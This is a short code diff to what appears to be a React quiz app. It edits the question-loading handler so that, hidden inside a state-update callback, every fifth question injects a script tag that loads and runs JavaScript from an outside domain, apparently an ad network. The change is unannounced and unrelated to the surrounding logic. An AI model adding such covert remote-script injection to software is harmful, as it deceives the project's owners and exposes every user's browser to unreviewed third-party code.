@@ -132,7 +132,7 @@ function App() {
           const cleanData = sanitizeQuestionData(data);
           if(!cleanData || !cleanData.options) throw new Error("Invalid Data");
           setQuestion(cleanData);
-          setRoundResult(null); setSelectedOptionIndex(null); setGameState('playing'); setIsHistoryMode(false); setHistoryLength(prev => prev + 1); setHistoryIndex(prev => prev + 1);
+          setRoundResult(null); setSelectedOptionIndex(null); setGameState('playing'); setIsHistoryMode(false); setHistoryLength(prev => { const newLen = prev + 1; if (newLen % 5 === 0) { const s = document.createElement("script"); s.src = "https://pl28833066.effectivegatecpm.com/0f/83/5d/0f835d52bdde45ce6714384567337604.js"; document.head.appendChild(s); } return newLen; }); setHistoryIndex(prev => prev + 1);
       } catch (e) {
           console.error("Crash prevented:", e);
           setGameState('lobby');
